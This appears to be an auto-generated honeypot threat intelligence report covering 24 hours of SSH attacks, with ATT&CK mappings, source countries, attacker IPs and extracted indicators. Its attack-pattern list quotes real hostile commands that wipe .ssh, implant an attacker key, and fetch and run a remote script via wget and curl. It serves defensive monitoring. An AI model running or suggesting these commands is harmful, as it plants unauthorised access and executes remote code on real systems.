# Threat Intelligence Report

**Generated**: 2026-04-02 09:42 UTC  
**Source**: LLM Honeypot Intelligence Platform  
**Window**: Last 24 hours  
**Classification**: TLP:AMBER

---

## Executive Summary

In the past 24 hours, the honeypot platform observed **5 events** from **505 unique source IPs** across **30 countries** and **37 autonomous systems**.

| Metric | Value |
|--------|-------|
| SSH Events (Beelzebub) | 5 |
| HTTP Events (Galah) | 0 |
| Unique Attacker IPs | 505 |
| Atomic Attack Patterns | 17 |
| MITRE ATT&CK Techniques | 5 |
| Generated Sigma Rules | 4 |
| Generated YARA Rules | 2 |
| Generated Suricata Rules | 5 |
| Blocked IPs (Firewall) | 174 |

---

## MITRE ATT&CK Mapping

| Technique | Name | Count |
|-----------|------|-------|
| T1552.004 (Private Keys) | | 12 |
| T1059.004 (Unix Shell) | | 3 |
| T1105 (Ingress Tool Transfer) | | 2 |
| T1222.002 (Linux File Permissions Modification) | | 2 |
| T1082 (System Information Discovery) | | 1 |

### Tactics Distribution

- **credential_access**: 12 events ██████
- **execution**: 3 events █
- **command_and_control**: 2 events █
- **defense_evasion**: 2 events █
- **discovery**: 1 events 

---

## Geographic Distribution

### Top Source Countries

| Country | Events |
|---------|--------|
| United States | 1,502 |
| Bulgaria | 455 |
| France | 370 |
| The Netherlands | 206 |
| India | 168 |
| United Kingdom | 122 |
| China | 118 |
| Germany | 66 |
| Portugal | 57 |
| Hong Kong | 56 |
| Japan | 48 |
| Singapore | 32 |
| Ukraine | 24 |
| Romania | 16 |
| Canada | 11 |

### Top ASNs (Autonomous Systems)

| ASN | Events |
|-----|--------|
| DigitalOcean, LLC | 541 |
| ColocaTel Inc. | 414 |
| Google LLC | 319 |
| Modat B.V. | 274 |
| ONYPHE SAS | 192 |
| Bharti Airtel Ltd., Telemedia Services | 168 |
| Amazon.com, Inc. | 157 |
| Pfcloud UG (haftungsbeschrankt) | 131 |
| Vpsvault.host Ltd | 99 |
| Alibaba US Technology Co., Ltd. | 92 |
| Hurricane Electric LLC | 92 |
| UCLOUD INFORMATION TECHNOLOGY HK LIMITED | 75 |
| Censys, Inc. | 74 |
| Microsoft Corporation | 72 |
| CHINA UNICOM China169 Backbone | 66 |

---

## Top Attacker IPs

| IP | Hits | Category |
|----|----- |----------|
| `85.11.167.11` | 411 | Attacker |
| `134.199.196.64` | 182 | Attacker |
| `134.209.166.254` | 181 | Attacker |
| `122.168.194.41` | 168 | Attacker |
| `85.217.140.43` | 153 | Attacker |
| `204.76.203.231` | 114 | Attacker |
| `129.212.184.91` | 76 | Attacker |
| `23.95.55.242` | 62 | Attacker |
| `45.205.1.110` | 56 | Attacker |
| `119.179.249.148` | 46 | Attacker |
| `142.93.48.150` | 39 | Attacker |
| `157.230.159.118` | 39 | Attacker |
| `69.164.213.201` | 39 | Attacker |
| `85.217.140.22` | 35 | Attacker |
| `18.218.118.203` | 29 | Attacker |
| `85.217.140.50` | 29 | Attacker |
| `45.205.1.5` | 28 | Attacker |
| `16.58.56.214` | 24 | Attacker |
| `92.63.197.22` | 24 | Attacker |
| `46.151.178.13` | 22 | Attacker |

---

## Indicators of Compromise (IOCs)

| Type | Count |
|------|-------|
| IPv4 Addresses | 505 |
| URLs | 1 |
| Domains | 0 |
| SHA256 Hashes | 0 |
| File Paths | 0 |

### Extracted URLs

- `https://31.57.216.121/sh`

---

## Top Attack Patterns (SSH)

- [2x] `chattr -ia .ssh`
- [2x] `lockr -ia .ssh`
- [2x] `rm -rf .ssh`
- [2x] `mkdir .ssh`
- [2x] `echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0`
- [2x] `chmod -R go= ~/.ssh`
- [1x] `uname -a`
- [1x] `echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A`
- [1x] `wget --no-check-certificate -qO- https://31.57.216.121/sh`
- [1x] `curl -sk https://31.57.216.121/sh`
- [1x] `sh -s ssh`

---

## Generated Rules Summary

All rules are stored in: `/data/ollama-proxy/generated-rules/`

| Format | Count | Path |
|--------|-------|------|
| Sigma (SIEM) | 4 | `sigma/*.yml` |
| YARA (Payload) | 2 | `yara/*.yar` |
| Suricata (IDS/IPS) | 5 | `suricata/honeypot.rules` |
| Firewall (iptables) | 174 IPs | `firewall/blocklist_*.sh` |
| STIX 2.1 Bundle | 1 | `stix/bundle.json` |
| IOC List | 1 | `iocs/ioc_list.json` |

---

*Report generated automatically by LLM Honeypot Intelligence Platform*